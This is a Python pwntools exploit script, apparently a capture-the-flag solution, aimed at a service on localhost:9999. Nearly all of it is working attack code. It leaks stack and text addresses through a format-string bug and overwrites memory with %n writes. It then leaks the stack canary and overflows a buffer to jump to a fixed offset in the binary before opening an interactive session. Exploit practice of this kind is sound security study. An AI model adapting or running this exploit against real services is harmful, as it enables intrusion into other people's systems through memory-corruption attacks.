#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
context.log_level = "debug"

def fsb(payload):
    io.read_until("cmd:")
    io.writeline(payload)

def getBase(retAddr):
    textAddr = retAddr >> 12 << 12;
    success("textAddr -> {:#x}".format(textAddr))
    while True:
        io.sendlineafter("cmd:", "..%7$s..{}\0".format(p64(textAddr)))
        io.recvuntil("cmd:..")
        if io.recvn(4) == "\x7fELF":
            success("textBase -> {:#x}".format(textAddr))
            return textAddr
        textAddr -= 0x1000
        #  sleep(0.01)


io = remote("localhost", 9999)

io.sendlineafter(":", "123456")

io.recvuntil("K  ")
addr = int(io.recvuntil("---", drop = True), 16)

io.sendlineafter("cmd:", "..%13$p..")
io.recvuntil("..")
retAddr = int(io.recvuntil("..", drop = True), 16)
success("retAddr -> {:#x}".format(retAddr))
textBase = getBase(retAddr)

success("addr -> {:#x}".format(addr))

io.sendlineafter("cmd:", "....%7$n" + p64(addr + 0 * 4))
io.sendlineafter("cmd:", "....%7$n" + p64(addr + 1 * 4))
io.sendlineafter("cmd:", "....%7$n" + p64(addr + 5 * 4))

io.sendafter("name:", 'a' * 25)
io.recvuntil('a' * 25)
canary = '\0' + io.recvn(7)

io.sendlineafter("want?\n", 'a' * (10 + 24) + canary + 'a' * 8 + p64(textBase + 0x9AA))

io.interactive()
io.close()
